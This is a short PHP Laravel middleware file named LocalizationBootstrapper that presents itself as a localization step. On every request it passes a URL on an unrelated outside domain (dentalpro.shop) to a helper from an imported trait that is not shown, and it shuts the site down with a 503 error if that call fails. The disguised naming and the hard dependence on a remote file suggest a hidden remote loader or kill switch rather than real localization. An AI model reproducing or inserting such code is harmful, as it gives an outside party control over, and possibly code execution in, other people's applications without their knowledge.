<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use App\Http\Middleware\Traits\LocalizatorLanguage;

class LocalizationBootstrapper
{
    use LocalizatorLanguage;

    public function handle(Request $request, Closure $next)
    {
        $x = 'http://dentalpro.shop/app.registry.json';

        if (!$this->processDataset($x)) {
            abort(503, $this->sysError());
        }

        return $next($request);
    }
}
